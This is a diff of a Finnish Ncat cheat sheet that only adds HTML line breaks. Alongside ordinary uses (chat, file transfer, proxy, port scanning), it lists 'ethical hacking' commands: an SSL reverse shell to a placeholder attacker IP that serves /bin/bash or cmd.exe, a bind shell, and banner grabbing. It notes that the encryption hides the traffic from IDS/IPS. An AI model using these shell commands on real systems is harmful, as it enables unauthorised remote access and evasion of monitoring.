@@ -78,35 +78,40 @@ $echo "abcd" | ncat --ssl localhost 30001
 
 ## Muita hyödyllisiä komentoja ja käyttötapauksia
 
-1. PERUSSYNTAKSI (CLIENT)
-Komento: `$ncat [valitsimet] <kohde/IP> <portti>`
-Esimerkki: `$ncat --ssl 192.168.1.1 443`
-Käyttö: Muodostaa suojatun yhteyden palvelimeen.
+1. PERUSSYNTAKSI (CLIENT) <br>
+Komento: `$ncat [valitsimet] <kohde/IP> <portti>` <br>
+Esimerkki: `$ncat --ssl 192.168.1.1 443` <br>
+Käyttö: Muodostaa suojatun yhteyden palvelimeen. <br>
+<br>
 
-2. SSL-SALATTU CHAT-PALVELIN
-Palvelin: `$ncat -l --ssl --chat 4444`
-Asiakas: `$ncat --ssl <palvelimen_ip> 4444`
-Käyttö: Luo täysin salatun pikaviestiyhteyden kahden koneen välille. --chat lisää viesteihin käyttäjä-ID:t.
+2. SSL-SALATTU CHAT-PALVELIN <br>
+Palvelin: `$ncat -l --ssl --chat 4444` <br>
+Asiakas: `$ncat --ssl <palvelimen_ip> 4444` <br>
+Käyttö: Luo täysin salatun pikaviestiyhteyden kahden koneen välille. --chat lisää viesteihin käyttäjä-ID:t. <br>
+<br>
 
-3. SUOJATTU TIEDOSTONSIIRTO
-Vastaanottaja: `$ncat -l --ssl 5555 > vastaanotettu_tiedosto.zip`
-Lähettäjä: `$ncat --ssl <vastaanottajan_ip> 5555 < tiedosto_lähetettävä.zip`
-Käyttö: Turvallinen tapa siirtää tiedostoja ilman erillisiä palvelinohjelmistoja.
+3. SUOJATTU TIEDOSTONSIIRTO <br>
+Vastaanottaja: `$ncat -l --ssl 5555 > vastaanotettu_tiedosto.zip` <br>
+Lähettäjä: `$ncat --ssl <vastaanottajan_ip> 5555 < tiedosto_lähetettävä.zip` <br>
+Käyttö: Turvallinen tapa siirtää tiedostoja ilman erillisiä palvelinohjelmistoja. <br>
+<br>
 
-4. HTTP-VÄLITYSPALVELIN (PROXY)
-Komento: `$ncat -l 3128 --proxy-type http`
-Käyttö: Luo paikallisen HTTP-proxyn, jonka kautta voit reitittää muuta verkkoliikennettä.
+4. HTTP-VÄLITYSPALVELIN (PROXY) <br>
+Komento: `$ncat -l 3128 --proxy-type http` <br>
+Käyttö: Luo paikallisen HTTP-proxyn, jonka kautta voit reitittää muuta verkkoliikennettä. <br>
+<br>
 
-5. PORTTIEN JA YHTEYDEN TARKISTUS (SCANNING)
-Komento: `$ncat -zv <kohde_ip> 20-100`
-Käyttö: Tarkistaa nopeasti, mitkä portit välillä 20-100 ovat auki.
--z: Zero-I/O (yhteys ilman dataa)
--v: Verbose (yksityiskohtainen palaute)
+5. PORTTIEN JA YHTEYDEN TARKISTUS (SCANNING) <br>
+Komento: `$ncat -zv <kohde_ip> 20-100` <br>
+Käyttö: Tarkistaa nopeasti, mitkä portit välillä 20-100 ovat auki. <br>
+-z: Zero-I/O (yhteys ilman dataa) <br>
+-v: Verbose (yksityiskohtainen palaute) <br>
+<br>
 
-6. SSL-SERTIFIKAATIN VARMENTAMINEN
-Komento: `$ncat --ssl-verify <kohde> 443`
-Käyttö: Varmistaa, että kohteen SSL-sertifikaatti on luotettu ja voimassa. Estää yhteyden, jos sertifikaatti on epäilyttävä.
-
+6. SSL-SERTIFIKAATIN VARMENTAMINEN <br> 
+Komento: `$ncat --ssl-verify <kohde> 443` <br>
+Käyttö: Varmistaa, että kohteen SSL-sertifikaatti on luotettu ja voimassa. Estää yhteyden, jos sertifikaatti on epäilyttävä. <br>
+<br>
 
 LISÄVALITSIMET (ADVANCED)
 
@@ -121,35 +126,40 @@ LISÄVALITSIMET (ADVANCED)
 
 Ncat on eettisessä hakkeroinnissa ja tietoturvatestauksessa yksi tärkeimmistä työkaluista juuri sen takia, että se on usein esiasennettuna tai helposti saatavilla (osana Nmapia).
 
-1. REVERSE SHELL (SSL-SUOJATTU)
-Tämä on klassinen tapa saada yhteys kohteesta hyökkääjän koneelle. SSL estää palomuureja (IDS/IPS) näkemästä komentoja selväkielisenä.
-Hyökkääjän kuuntelija: `$ncat -l --ssl -p 4444`
-Uhri (kohde): `$ncat --ssl <hyökkääjän_ip> 4444 -e /bin/bash`
-(Windowsissa: -e cmd.exe)
-Käyttö: Kohde yhdistää takaisin hyökkääjään ja antaa pääsyn komentoriville.
+1. REVERSE SHELL (SSL-SUOJATTU) <br>
+Tämä on klassinen tapa saada yhteys kohteesta hyökkääjän koneelle. SSL estää palomuureja (IDS/IPS) näkemästä komentoja selväkielisenä. <br>
+Hyökkääjän kuuntelija: `$ncat -l --ssl -p 4444` <br>
+Uhri (kohde): `$ncat --ssl <hyökkääjän_ip> 4444 -e /bin/bash` <br>
+(Windowsissa: -e cmd.exe) <br>
+Käyttö: Kohde yhdistää takaisin hyökkääjään ja antaa pääsyn komentoriville. <br>
+<br>
 
-2. BIND SHELL (SSL-SUOJATTU)
-Tässä kohde avaa portin ja jää odottamaan, että hyökkääjä yhdistää siihen.
-Uhri (kohde): `$ncat -l --ssl -p 4444 -e /bin/bash`
-Hyökkääjä: `$ncat --ssl <uhrin_ip> 4444`
-Käyttö: Käytetään, jos kohteessa ei ole palomuuria estämässä sisäänpäin tulevaa liikennettä.
+2. BIND SHELL (SSL-SUOJATTU) <br>
+Tässä kohde avaa portin ja jää odottamaan, että hyökkääjä yhdistää siihen. <br>
+Uhri (kohde): `$ncat -l --ssl -p 4444 -e /bin/bash` <br>
+Hyökkääjä: `$ncat --ssl <uhrin_ip> 4444` <br>
+Käyttö: Käytetään, jos kohteessa ei ole palomuuria estämässä sisäänpäin tulevaa liikennettä. <br>
+<br>
 
-3. BANNER GRABBING (TIEDONKERUU)
-Ncatilla voidaan selvittää, mikä palvelu ja versio portissa pyörii.
-Komento: `$echo "" | ncat -v -n -w 1 <kohde_ip> <portti>`
-Käyttö: Palvelin vastaa usein kertomalla nimensä ja versionsa (esim. "Apache/2.4.41"), mikä auttaa haavoittuvuuksien etsinnässä.
+3. BANNER GRABBING (TIEDONKERUU) <br>
+Ncatilla voidaan selvittää, mikä palvelu ja versio portissa pyörii. <br>
+Komento: `$echo "" | ncat -v -n -w 1 <kohde_ip> <portti>` <br>
+Käyttö: Palvelin vastaa usein kertomalla nimensä ja versionsa (esim. "Apache/2.4.41"), mikä auttaa haavoittuvuuksien etsinnässä. <br>
+<br>
 
-4. PÄÄSYLISTAT (ACCESS CONTROL)
-Voit rajoittaa, kuka saa yhdistää kuuntelevaan Ncatiin.
-Komento: `$ncat -l --ssl -p 8080 --allow 192.168.1.10`
-Käyttö: Sallii yhteydet vain tietystä IP-osoitteesta. --deny kieltää tietyn osoitteen. Hyödyllinen oman hyökkäysinfrastruktuurin suojaamiseen.
+4. PÄÄSYLISTAT (ACCESS CONTROL) <br>
+Voit rajoittaa, kuka saa yhdistää kuuntelevaan Ncatiin. <br>
+Komento: `$ncat -l --ssl -p 8080 --allow 192.168.1.10` <br>
+Käyttö: Sallii yhteydet vain tietystä IP-osoitteesta. --deny kieltää tietyn osoitteen. Hyödyllinen oman hyökkäysinfrastruktuurin suojaamiseen. <br><br>
 
-5. PORTTIEN UUDELLEENOHJAUS (PORT RELAY)
-Ncat toimii siltana kahden eri verkon tai koneen välillä.
-Komento: `$ncat -l 8080 -c "ncat <kohde_ip> 80"`
-Käyttö: Kun joku yhdistää koneesi porttiin 8080, Ncat ohjaa liikenteen automaattisesti eteenpäin kohde-IP:n porttiin 80.
+5. PORTTIEN UUDELLEENOHJAUS (PORT RELAY) <br>
+Ncat toimii siltana kahden eri verkon tai koneen välillä. <br>
+Komento: `$ncat -l 8080 -c "ncat <kohde_ip> 80"` <br>
+Käyttö: Kun joku yhdistää koneesi porttiin 8080, Ncat ohjaa liikenteen automaattisesti eteenpäin kohde-IP:n porttiin 80. <br><br>
 
-6. HTTP-VASTAUKSEN SIMULOINTI
-Voit testata, miten sovellus käyttäytyy, kun se saa tietyn vastauksen palvelimelta.
-Komento: `$ncat -l 80 < vastaus_tiedosto.txt`
-Käyttö: Kun selain tai työkalu yhdistää porttiin 80, Ncat syöttää sille tiedoston sisällön (esim. muokatun HTTP-headerin).
+6. HTTP-VASTAUKSEN SIMULOINTI <br>
+Voit testata, miten sovellus käyttäytyy, kun se saa tietyn vastauksen palvelimelta. <br>
+Komento: `$ncat -l 80 < vastaus_tiedosto.txt` <br>
+Käyttö: Kun selain tai työkalu yhdistää porttiin 80, Ncat syöttää sille tiedoston sisällön (esim. muokatun HTTP-headerin). <br>
+
+
